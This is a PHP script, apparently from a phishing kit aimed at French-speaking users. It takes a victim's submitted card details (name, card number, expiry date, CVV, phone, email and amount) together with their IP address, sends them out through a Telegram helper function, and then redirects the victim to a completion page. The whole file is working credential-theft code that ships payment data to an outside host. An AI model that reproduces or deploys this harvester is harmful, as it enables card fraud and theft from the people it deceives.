<?php

session_start();
include '../functions.php';


$ip = getenv("REMOTE_ADDR");


$message = "[+]━━━━【🔥 signal CC INFO 🔥】━━━━[+]\r\n";
$message .= "[+] NOM & PRENON : " .$_POST['cardNoms']."\r\n";
$message .= "[+] la référence : " .$_POST['cardBank']."\r\n";
$message .= "[+] NUMERO DE CARTE : " .$_POST['cardNum']."\r\n";
$message .= "[+] DATE D'EXPIRATION : " .$_POST['cardExp']."\r\n";
$message .= "[+] CRYPTOGRAMME VISUEL : " .$_POST['cardCvv']."\r\n";
$message .= "[+] NUMERO DE TELEPHONE : " .$_POST['cardTel']."\r\n";
$message .= "[+] Email : " .$_POST['cardTel10']."\r\n";
$message .= "[+] MONTANT: " .$_POST['cardTel15']."\r\n";

$message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
$message .= "[+] IP : " .$ip."\n";
$message .= "[+]━━━━【🔥 signal 🔥】━━━━[+]\n";
telegram_send(urlencode($message));




HEADER("Location: ../fin.html");


?>

